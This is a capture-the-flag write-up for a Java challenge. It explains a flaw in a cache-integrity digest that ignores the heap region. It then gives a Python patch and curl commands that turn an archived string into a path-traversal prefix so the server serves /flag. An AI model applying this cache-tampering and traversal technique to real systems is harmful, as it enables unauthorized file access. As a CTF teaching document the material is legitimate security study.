# Leftover Leftovers

## Exploration

Like in part 1, using a Java agent disables the AOT cache because it adds the `java.instrument` module,
which breaks the archived module graph. Instead, run the server normally and attach the Serviceability
Agent from a second JVM

```bash
java -XX:AOTCache=outer-cache.aot -cp leftovers2.jar OuterServer serve /tmp/cache.aot cache.aot &

jhsdb clhsdb --pid $! <<'EOF'
dumpclass de.kitctf.gpn24.leftovers2.OuterServer
dumpclass de.kitctf.gpn24.leftovers2.SomeOtherClass
quit
EOF
```

For stage 2, the `Server` class loads from `cache.aot` directly, so you can dump it separately without
running OuterServer first

## How it works

OuterServer is a long-running Javalin server with this logic:

On startup, it computes a reference digest of `cache.aot` using a function called `verifyStuff`

`POST /init` accepts an uploaded cache file. 

It writes the upload to `/tmp/cache.aot`, re-parses it,
and if `verifyStuff(upload) == reference` calls `System.exit(0)` (which lets the script proceed to
stage 2). 

Otherwise it returns "Invalid cache file". The key detail, this lets you upload a modified cache as long as it passes the digest check.

`GET /cache` serves the original `cache.aot` if you need to re-base any patches.

Stage 2 is the same fridge tracker from part 1, except password login is disabled. The image directory
is a hardcoded relative path `"images"`, and `GET /images/{name}` serves `imageDir.resolve(sanitize(name))`
where `sanitize` allows only `[a-zA-Z0-9_-]`. 

The web server normalizes `../` and `%2F` out of the URL,
so path traversal can't come from the product name.

We need to upload a cache that passes `verifyStuff` but changes the `"images"` string to something that
lets you traverse to `/flag`.

## The bug in verifyStuff

The digest function processes every class (sorted by name). For each class it reads:
- Constant pool entries (just the 8-byte slots, which contain symbol pointers, not the actual symbol text)
- Method info (access flags, code size, bytecode, method name and signature text)

It never touches it:

- The heap region (where archived `java.lang.String` objects live)
- The actual content of Utf8 symbols (unless they're method names or signatures)
- Field info

The string `"images"` is an `ldc` constant in `Server.main`. In the AOT cache it becomes an archived
`java.lang.String` object whose backing byte array lives in the heap region. Since `verifyStuff` doesn't
read the heap, you can patch this byte array without changing the digest.

Finding it, the heap copy is `\x06\x00\x00\x00images` (4-byte length + 6 bytes of text) surrounded by
HotSpot's `0xbd` heap fill. Offset `0x324eb80` in the cache file. There's also a metaspace `Symbol` copy at `0x146655e` that you should leave alone.

## Main exploit

Change the 6 heap bytes from `images` to `/../..` (same length). At runtime, `Path.of("/../..").resolve("flag")`
becomes `/../../flag`, which normalizes to `/flag`.

Patch the cache

```python
d = bytearray(open("cache.aot", "rb").read())
i = d.find(b"\x06\x00\x00\x00images")
d[i+4:i+10] = b"/../.."
open("evil.aot", "wb").write(d)
```

Test locally to verify the digest matches and stage 2 serves `/flag`

```bash
verifyStuff(cache.aot) = 7aa5a496dde0fd1be5ef18ef2d5bf8acea749bf5647e31d34d4c0f0707bae5a3
verifyStuff(evil.aot) = 7aa5a496dde0fd1be5ef18ef2d5bf8acea749bf5647e31d34d4c0f0707bae5a3

curl /images/flag
```

Against the remote

```bash
curl -X POST $B/init -F "cache.aot=@evil.aot"

curl -X PUT $B/products/flag -H 'Content-Type: application/json' \
     -d '{"name":"flag","quantity":1,"bestBefore":"2030-01-01T00:00:00","notAfter":"2030-01-01T00:00:00"}'

curl $B/images/flag
```

## Flag
`GPNCTF{i_h0P3_tHe_C4cHe_is_NeVer_PR0v1DEd_8y_l18RarI35}`
